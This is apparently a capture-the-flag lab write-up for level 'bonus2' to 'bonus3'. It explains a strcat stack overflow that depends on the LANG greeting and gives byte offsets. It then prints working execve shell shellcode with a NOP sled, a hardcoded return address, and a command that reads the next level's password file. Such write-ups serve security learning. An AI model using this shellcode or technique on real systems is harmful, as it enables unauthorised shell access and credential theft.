# bonus2 → bonus3

`main` prepares a 76-byte argument: up to 40 bytes from `argv[1]`, then
up to 32 from `argv[2]`, with the rest zero. It passes that block by value
to `greetuser`. The latter appends it with unchecked `strcat` to a stack
greeting, overflowing the saved return address.

The greeting depends on the first two bytes of `LANG`. The Dutch prefix
`Goedemiddag! ` is 13 ASCII bytes; with 40 bytes from `argv[1]`, 23 bytes
of `argv[2]` precede the saved return address. The Finnish text contains
multibyte UTF-8 characters, so character counts would give the wrong byte
offset. The shell commands below quote the binary arguments so shell
metacharacters in generated bytes are not interpreted.

In the VM, GDB located an `EGG` value at `0xbffff7da` with this minimal
environment. `0xbffffb11` points into its 2000-byte NOP sled and contains
no NUL or newline bytes. Check the address in a different environment.
From the bonus2 account:

```sh
EGG=$(python2.7 -c 'sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"; print "\x90"*2000 + sc')
A=$(python2.7 -c 'print "A"*40')
B=$(python2.7 -c 'import struct; print "B"*23 + struct.pack("<I",0xbffffb11)')
printf 'id\ncat /home/user/bonus3/.pass\n' | env -i LANG=nl EGG="$EGG" ./bonus2 "$A" "$B"
```

`disassemble main` shows the two `strncpy` lengths and 76-byte stack copy;
`disassemble greetuser` shows the language-specific prefix and `strcat`.
